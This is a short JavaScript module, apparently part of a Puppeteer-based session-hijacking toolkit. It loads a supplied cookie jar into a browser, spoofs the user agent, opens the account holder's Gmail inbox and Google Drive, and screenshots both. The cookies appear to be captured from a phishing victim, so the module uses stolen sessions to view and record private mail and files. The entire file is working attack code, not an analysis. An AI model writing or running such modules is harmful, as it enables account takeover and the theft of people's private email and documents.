'use strict';

const necrohelp = require('../helpers/necrohelp');
const db = require('../../db/db');

exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
    await necrohelp.runTask(db, taskId, async () => {
        await necrohelp.SetCookieJar(page, cookies);
        await necrohelp.ConfigureUserAgent(page, params?.userAgent, taskId);
        await necrohelp.timedGoto(page, 'https://mail.google.com/mail/u/0/#inbox');
        await necrohelp.Sleep(2000);
        await necrohelp.ScreenshotCurrentPage(page, taskId);
        await page.click('a[aria-label="Google apps"]');
        await necrohelp.Sleep(2000);
        await necrohelp.timedGoto(page, 'https://drive.google.com/drive/my-drive');
        await necrohelp.Sleep(2000);
        await necrohelp.ScreenshotCurrentPage(page, taskId);
    });
};
